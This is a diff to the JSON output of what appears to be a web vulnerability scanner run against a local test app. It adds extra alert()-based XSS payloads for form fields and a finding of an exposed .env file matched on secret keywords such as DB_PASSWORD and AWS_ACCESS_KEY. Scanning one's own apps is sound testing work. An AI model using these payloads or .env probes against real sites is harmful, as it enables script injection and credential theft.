@@ -1,28 +1,5 @@
 [
   {
-    "url": "http://127.0.0.1:5000/comment",
-    "xss": [
-      {
-        "form": {
-          "action": "http://127.0.0.1:5000/comment",
-          "method": "post",
-          "inputs": [
-            "name"
-          ]
-        },
-        "payloads": [
-          "<script>alert('XSS')</script>",
-          "<img src=x onerror=alert('XSS')>",
-          "<svg/onload=alert('XSS')>",
-          "\"><script>alert(String.fromCharCode(88,83,83))</script>",
-          "<iframe src=javascript:alert('XSS')>",
-          "<body onload=alert('XSS')>"
-        ]
-      }
-    ],
-    "sqli": false
-  },
-  {
     "url": "http://127.0.0.1:5000/user?id=1",
     "xss": [],
     "sqli": [
@@ -43,7 +20,8 @@
           ]
         }
       }
-    ]
+    ],
+    "info_leak": []
   },
   {
     "url": "http://127.0.0.1:5000",
@@ -62,11 +40,17 @@
           "<svg/onload=alert('XSS')>",
           "\"><script>alert(String.fromCharCode(88,83,83))</script>",
           "<iframe src=javascript:alert('XSS')>",
-          "<body onload=alert('XSS')>"
+          "<body onload=alert('XSS')>",
+          "\" onfocus=alert(1) autofocus=\"",
+          "</textarea><script>alert(1)</script>",
+          "';alert(1);//",
+          "<details open ontoggle=alert(1)>",
+          "<marquee onstart=alert(1)>"
         ]
       }
     ],
-    "sqli": false
+    "sqli": [],
+    "info_leak": []
   },
   {
     "url": "http://127.0.0.1:5000/",
@@ -85,10 +69,63 @@
           "<svg/onload=alert('XSS')>",
           "\"><script>alert(String.fromCharCode(88,83,83))</script>",
           "<iframe src=javascript:alert('XSS')>",
-          "<body onload=alert('XSS')>"
+          "<body onload=alert('XSS')>",
+          "\" onfocus=alert(1) autofocus=\"",
+          "</textarea><script>alert(1)</script>",
+          "';alert(1);//",
+          "<details open ontoggle=alert(1)>",
+          "<marquee onstart=alert(1)>"
         ]
       }
     ],
-    "sqli": false
+    "sqli": [],
+    "info_leak": []
+  },
+  {
+    "url": "http://127.0.0.1:5000/comment",
+    "xss": [
+      {
+        "form": {
+          "action": "http://127.0.0.1:5000/comment",
+          "method": "post",
+          "inputs": [
+            "name"
+          ]
+        },
+        "payloads": [
+          "<script>alert('XSS')</script>",
+          "<img src=x onerror=alert('XSS')>",
+          "<svg/onload=alert('XSS')>",
+          "\"><script>alert(String.fromCharCode(88,83,83))</script>",
+          "<iframe src=javascript:alert('XSS')>",
+          "<body onload=alert('XSS')>",
+          "\" onfocus=alert(1) autofocus=\"",
+          "</textarea><script>alert(1)</script>",
+          "';alert(1);//",
+          "<details open ontoggle=alert(1)>",
+          "<marquee onstart=alert(1)>"
+        ]
+      }
+    ],
+    "sqli": [],
+    "info_leak": [
+      {
+        "file": ".env",
+        "url": "http://127.0.0.1:5000/static/.env",
+        "status": 200,
+        "size": 1232,
+        "keywords": [
+          "DB_PASSWORD",
+          "API_KEY",
+          "SECRET",
+          "SECRET_KEY",
+          "AWS_ACCESS_KEY",
+          "PASSWORD=",
+          "STRIPE",
+          "SENDGRID",
+          "JWT_SECRET"
+        ]
+      }
+    ]
   }
 ]
